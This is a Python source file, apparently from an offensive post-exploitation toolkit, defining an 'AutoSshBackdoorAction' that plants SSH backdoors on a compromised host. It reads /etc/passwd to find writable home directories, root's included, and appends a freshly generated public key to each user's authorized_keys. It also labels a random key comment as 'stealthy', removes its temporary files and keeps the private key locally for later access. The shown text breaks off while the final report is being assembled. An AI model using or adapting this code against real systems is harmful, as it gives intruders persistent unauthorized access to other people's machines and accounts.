import subprocess
import tempfile
import os
from pathlib import Path

# External library imports
from loguru import logger

# Local application/library specific imports
from toboggan.src.action import BaseAction
from toboggan.src.utils.common import generate_fixed_length_token


class AutoSshBackdoorAction(BaseAction):
    DESCRIPTION = (
        "Generate an SSH key remotely and drop it into writable user .ssh directories."
    )

    def run(self) -> str:

        sshd_path = self._executor.os_helper.get_command_location("sshd")
        if not sshd_path or "not found" in sshd_path.lower():
            logger.warning(
                "⚠️ sshd is not installed on the target. SSH backdoor is currently unusable."
            )
            return "⚠️ sshd is not installed on the target."
        else:
            logger.info(f"🧭 sshd binary found at: {sshd_path.strip()}")
            # Check if sshd is running
            check_sshd = self._executor.remote_execute("ps aux | grep '[s]shd'")
            if not check_sshd or "sshd" not in check_sshd:
                logger.warning(
                    "⚠️ sshd is not running on the target. You may need to start it manually."
                )
                return "⚠️ sshd is not running on the target."
            else:
                logger.success("✅ sshd is running.")

        # Step 1: Locate ssh-keygen
        sshkeygen_path = self._executor.os_helper.get_command_location("ssh-keygen")
        if not sshkeygen_path or "not found" in sshkeygen_path.lower():
            logger.warning("❌ ssh-keygen not available on target. Trying locally...")

            if os.name != "posix":
                return "❌ ssh-keygen not available remotely, and local OS is not Unix."

            # Use tempfile for key generation
            with tempfile.TemporaryDirectory() as tmpdir:
                tmpdir_path = Path(tmpdir)
                key_path = tmpdir_path / "id_ed25519"
                comment = generate_fixed_length_token(12)

                # Generate key locally
                try:
                    subprocess.run(
                        [
                            "ssh-keygen",
                            "-t",
                            "ed25519",
                            "-f",
                            str(key_path),
                            "-N",
                            "",
                            "-C",
                            comment,
                            "-q",
                        ],
                        check=True,
                    )
                except Exception as e:
                    return f"❌ Failed to generate key locally: {e}"

                private_key = key_path.read_text()
                public_key = (key_path.with_suffix(".pub")).read_text()
                logger.info("🔑 SSH keypair generated locally.")
        else:
            logger.info(f"🔑 ssh-keygen found at: {sshkeygen_path}")
            # Step 3: Generate random key filename and comment
            token = generate_fixed_length_token(6)
            key_path = f"/tmp/id_ed25519_{token}"
            comment = generate_fixed_length_token(12)  # stealthy random comment

            # Step 4: Generate SSH keypair
            gen_cmd = (
                f"{sshkeygen_path} -t ed25519 -f {key_path} -N '' -C '{comment}' -q"
            )
            self._executor.remote_execute(gen_cmd)

            logger.info(f"🔑 SSH keypair generated at: {key_path}")

            # Step 5: Read keys
            private_key = self._executor.remote_execute(f"cat {key_path}")
            public_key = self._executor.remote_execute(f"cat {key_path}.pub")
            if not private_key or not public_key:
                return "❌ Failed to read generated key pair."

            logger.info("🔑 SSH keypair read successfully.")

        # Step 2: Identify candidate users
        passwd_data = self._executor.remote_execute("cat /etc/passwd")
        if not passwd_data:
            return "❌ Could not read /etc/passwd."

        logger.info("🔍 Searching for writable home directories...")

        candidate_users = []
        for line in passwd_data.strip().splitlines():
            parts = line.split(":")
            if len(parts) < 7:
                continue
            username, _, uid, _, _, home, _ = parts
            try:
                if username != "root":
                    if int(uid) < 1000 or username in ["nobody", "sync"]:
                        continue
            except ValueError:
                continue

            test_write = self._executor.remote_execute(
                f"test -w {home} && echo OK || echo NO"
            )
            if test_write and "OK" in test_write:
                candidate_users.append((username, home))

        if not candidate_users:
            return "⚠️ No writable home directories found."

        logger.info(f"👤 Found {len(candidate_users)} writable home directories.")

        # Step 6: Inject pubkey to each valid user's authorized_keys
        injected = []
        pubkey_escaped = public_key.strip().replace("'", "'\\''")

        for username, home in candidate_users:
            ssh_dir = f"{home}/.ssh"
            auth_keys = f"{ssh_dir}/authorized_keys"
            install_cmd = (
                f"mkdir -p {ssh_dir} && chmod 700 {ssh_dir} && "
                f"echo '{pubkey_escaped}' >> {auth_keys} && chmod 600 {auth_keys}"
            )
            self._executor.remote_execute(install_cmd)

            injected.append((username, auth_keys))

        # Step 7: Clean up temporary keypair
        self._executor.remote_execute(f"rm -f {key_path} {key_path}.pub")

        # Save private key locally
        local_save_path = Path.cwd() / "id_ed25519_backdoor"
        try:
            local_save_path.write_text(private_key)
            local_save_path.chmod(0o600)
            logger.success(f"💾 Private key saved locally: {local_save_path}")
        except Exception as e:
            return f"❌ Failed to save private key locally: {e}"

        if not injected:
            return "⚠️ No key could be injected despite writable home directories."

        # Step 8: Report
        output = "\n🔐 SSH public key installed for:\n"
        output += "-" * 60 + "\n"
        for username, path in injected:
            output += f"👤 {username:<15} → {path}\n"
        output += "-" * 60 + "\n"
        output += "\n🔑 Private Key (save this locally to connect):\n"
        output += "-"
